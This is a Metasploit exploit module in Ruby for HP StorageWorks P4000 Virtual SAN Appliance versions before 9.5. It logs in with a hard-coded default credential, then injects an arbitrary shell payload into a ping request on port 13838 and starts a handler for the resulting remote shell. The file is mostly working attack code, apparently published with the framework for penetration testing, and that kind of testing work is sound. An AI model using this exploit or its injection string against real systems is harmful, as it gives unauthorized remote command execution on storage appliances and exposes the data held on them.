# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = ExcellentRanking
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "HP StorageWorks P4000 Virtual SAN Appliance Command Execution",
            &#039;Description&#039;    => %q{
                    This module exploits a vulnerability found in HP&#039;s StorageWorks P4000 VSA,
                versions prior to 9.5.  By using a default account credential, it is possible
                to inject arbitrary commands as part of a ping request via port 13838.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Nicolas Gregoire&#039;,  #Discovery, PoC, additional assistance
                    &#039;sinn3r&#039;             #Metasploit
                ],
            &#039;References&#039;     =>
                [
                    [&#039;EDB&#039;, &#039;18893&#039;],
                    [&#039;URL&#039;, &#039;http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?loc=en_US&id=958&#039;],
                    [&#039;URL&#039;, &#039;http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c03082086&#039;]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "/",
                    &#039;Compat&#039;   =>
                        {
                            &#039;PayloadType&#039; => &#039;cmd&#039;,
                            &#039;RequiredCmd&#039; => &#039;generic perl telnet bash&#039;
                        }
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;ExitFunction&#039; => "none"
                },
            &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
            &#039;Arch&#039;           => ARCH_CMD,
            &#039;Targets&#039;        =>
                [
                    [&#039;HP VSA prior to 9.5&#039;, {}]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Nov 11 2011",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptPort.new(&#039;RPORT&#039;, [true, &#039;The remote port&#039;, 13838])
            ], self.class)
    end
 
 
    def generate_packet(data)
        pkt = "\x00\x00\x00\x00\x00\x00\x00\x01"
        pkt << [data.length + 1].pack("N*")
        pkt << "\x00\x00\x00\x00"
        pkt << "\x00\x00\x00\x00\x00\x00\x00\x00"
        pkt << "\x00\x00\x00\x14\xff\xff\xff\xff"
        pkt << data
        pkt << "\x00"
 
        pkt
    end
 
 
    def exploit
        connect
 
        # Login packet
        print_status("Sending login packet")
        packet = generate_packet("login:/global$agent/L0CAlu53R/Version \"8.5.0\"")
        sock.put(packet)
        res = sock.get_once
        vprint_status(Rex::Text.to_hex_dump(res)) if res
 
        # Command execution
        print_status("Sending injection")
        data = "get:/lhn/public/network/ping/127.0.0.1/foobar;#{payload.encoded}/"
        packet = generate_packet(data)
        sock.put(packet)
        res = sock.get_once
        vprint_status(Rex::Text.to_hex_dump(res)) if res
 
        handler
        disconnect
    end
end



